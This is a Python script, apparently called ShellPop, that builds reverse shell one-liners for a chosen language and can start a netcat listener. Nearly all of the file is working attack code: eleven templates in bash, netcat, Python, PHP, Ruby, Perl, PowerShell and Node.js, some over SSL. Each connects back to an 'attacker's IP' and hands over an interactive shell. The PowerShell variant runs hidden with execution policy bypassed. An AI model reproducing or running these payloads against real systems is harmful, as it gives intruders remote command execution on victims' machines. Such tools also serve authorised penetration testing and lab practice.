#!/usr/bin/env python3

import re
import os
import sys
from typing import Dict

# ANSI color codes
RESET = "\033[0m"
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
BOLD = "\033[1m"
BRIGHT_WHITE = "\033[97m"

# ASCII art with raw string to handle escape sequences
ascii_art = r"""
  _________ ___ ___         .__  .__ __________
 /   _____//   |   \   ____ |  | |  |/_____   /____ ______
 \_____  \/    ~    \_/ __ \|  | |  | |    ___/  _ \/____ \
 /        \    Y    /\  ___/|  |_|  |_|    |  (  <_> )  |_> >
/_______  /\___|_  /  \___  >____/____|____|   \____/|   __/
        \/       \/       \/                          |__|

              A reverse shell generator and listener!
              Made with <3 by 5epi0l.
"""

def get_shells(ip: str, port: str) -> Dict[str, str]:
    """Return a dictionary of shell commands for different languages."""
    return {
        "python": f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'""",
        
        "netcat": f"""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f""",
        
        "bash": f"""bash -i >& /dev/tcp/{ip}/{port} 0>&1""",
        
        "php": f"""php -r '$sock=fsockopen("{ip}",{port});shell_exec("sh <&3 >&3 2>&3");'""",
        
        "ruby": f"""ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))'""",
        
        "perl": f"""perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");}};'""",
        
        "powershell": f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
        
        "nodejs": f"""node -e 'const net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);const client=new net.Socket();client.connect({port},"{ip}",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)}});'""",
        
        "python-ssl": f"""python3 -c 'import ssl,socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s=ssl.wrap_socket(s);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")'""",
        
        "ruby-ssl": f"""ruby -rsocket -ropenssl -e 'context=OpenSSL::SSL::SSLContext.new(:TLSv1);s=TCPSocket.new("{ip}",{port});ssl=OpenSSL::SSL::SSLSocket.new(s,context);ssl.connect;while(cmd=ssl.gets);IO.popen(cmd.to_s,"r"){{|io|ssl.print io.read}}end'""",
        
        "nodejs-ssl": f"""node -e 'const tls=require("tls");const cp=require("child_process");const sh=cp.spawn("/bin/sh",[]);const client=tls.connect({port},"{ip}",{{rejectUnauthorized:false}},function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)}});'"""
    }

def is_valid_ip(ip: str) -> bool:
    """Validate IP address format."""
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(part) <= 255 for part in ip.split('.'))

def is_valid_port(port: str) -> bool:
    """Validate port number."""
    try:
        port_num = int(port)
        return 0 < port_num <= 65535
    except ValueError:
        return False

def main():
    """Main function to run the shell generator."""
    try:
        print(f"{RED}{ascii_art}{RESET}")
        
        print(f"{GREEN}[+]Choose an option from the menu below:{RESET}")
        print(f"{CYAN}1. Python\n2. Netcat\n3. Bash\n4. PHP\n5. Ruby\n6. Perl\n7. PowerShell\n8. NodeJS")
        print(f"9. Python (SSL)\n10. Ruby (SSL)\n11. NodeJS (SSL){RESET}\n")
        
        # Map numbers to shell types
        shell_map = {
            "1": "python",
            "2": "netcat",
            "3": "bash",
            "4": "php",
            "5": "ruby",
            "6": "perl",
            "7": "powershell",
            "8": "nodejs",
            "9": "python-ssl",
            "10": "ruby-ssl",
            "11": "nodejs-ssl"
        }
        
        choice = input("Enter your choice (1-11): ")
        
        if choice not in shell_map:
            print(f"{RED}Invalid Input! Please choose a number between 1 and 11\nexiting!{RESET}")
            sys.exit(1)
        
        shell_type = shell_map[choice]
        
        ip = input("Enter attacker's IP: ")
        if not is_valid_ip(ip):
            print(f"{RED}Invalid IP\nexiting!{RESET}")
            sys.exit(1)
        
        port = input("Enter listening port: ")
        if not is_valid_port(port):
            print(f"{RED}Invalid Port\nexiting!{RESET}")
            sys.exit(1)
        
        shells = get_shells(ip, port)
        shell_cmd = shells[shell_type]
        
        print(f"Your {shell_type} reverse shell is: {BLUE}{shell_cmd}{RESET}\n")
        
        if input(f"{GREEN}[+]Do You want to start the listener ?[Y/N]{RESET}\n").lower() == 'y':
            print(f"{BOLD}[+]Starting the netcat listener...{RESET}")
            os.system(f"nc -nvlp {port}")
            
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Keyboard Interrupt detected. Exiting gracefully...{RESET}")
        sys.exit(0)

if __name__ == "__main__":
    main() 